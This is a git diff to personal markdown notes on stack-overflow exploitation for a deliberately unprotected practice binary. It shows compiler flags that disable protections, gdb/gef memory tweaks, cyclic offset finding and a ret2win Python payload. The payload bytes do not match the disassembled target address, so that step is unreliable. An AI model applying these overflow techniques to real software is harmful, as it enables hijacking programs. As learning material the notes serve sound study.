@@ -15,7 +15,7 @@ gcc CodeFile.c -o CodeFile -fno-stack-protector -z execstack -no-pie -m32  #Comp
 ```powershell
 -fno-stack-protector	#preventing adding canary
 -z execstack		#stack is marked as executable
--no-pie			#program will load to the same memory each time
+-no-pie			#program will load to the same memory each time. if you have it enabled, you won't get the memory address of any function. instead you will get the offset.
 -m32			#32-bits
 ```
 ### Checksec
@@ -118,7 +118,7 @@ printf("Failed to log in as Admin (autho"..., 0Failed to log in as Admin (author
 +++ exited (status 0) +++
 ```
 
-### check the value
+### check a hex value
 ```powershell
     0x8049219 <main+131>       push   eax
     0x804921a <main+132>       call   0x8049070 <puts@plt>
@@ -137,4 +137,56 @@ printf("Failed to log in as Admin (autho"..., 0Failed to log in as Admin (author
 Python Exception <class 'AttributeError'>: partially initialized module 'pwndbg' has no attribute 'gdblib' (most likely due to a circular import)
 gef➤  x $ebp - 0xc
 0xffffd2fc:     0x00000000
+```
+
+### set a hex value
+```pwoershell
+gef➤  x $ebp - 0xc
+0xffffd2fc:     0x00000000
+gef➤  set *0xffffd2fc = 1
+gef➤  x $ebp - 0xc
+0xffffd2fc:     0x00000001
+gef➤ 
+```
+
+### cyclic pattern
+```powershell
+cyclic 100	# create a pattern of 100 charectors
+cyclic -l haaa	# determin how many letters you need before the buffer
+```
+
+### ret2win
+```powershell
+# 1.first you need to determine the buffer (how many characters we need before starting the buffer)
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0x33      
+$ebx   : 0x61616166 ("faaa"?)
+$ecx   : 0xffffd29c  →  0xbda1fe00
+$edx   : 0x1       
+$esp   : 0xffffd310  →  "iaaajaaa"
+$ebp   : 0x61616167 ("gaaa"?)
+$esi   : 0x0804bf04  →  0x08049150  →  <__do_global_dtors_aux+0> endbr32 
+$edi   : 0xf7ffcba0  →  0x00000000
+$eip   : 0x61616168 ("haaa"?)
+$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
+
+#here it shows that we can set the address of hacked function after 28 characters. starting from `"haaa"`
+
+# 2.determin the memory location of hacked function
+gef➤  disassemble hacked
+Dump of assembler code for function hacked:
+   0x08049186 <+0>:     push   ebp
+   0x08049187 <+1>:     mov    ebp,esp
+   0x08049189 <+3>:     push   ebx
+ 
+# 3.use python to getarate your payload
+python2 -c 'print "A" * 28 + "\x82\x46\x12\02"' > payload
+
+# 4.run your payload in gdb
+run < payload
+
+notes:
+EIP is where the 4 bytes of buffer starts
+ESP whatever left from the string (where we need to point to hacked function)
 ```
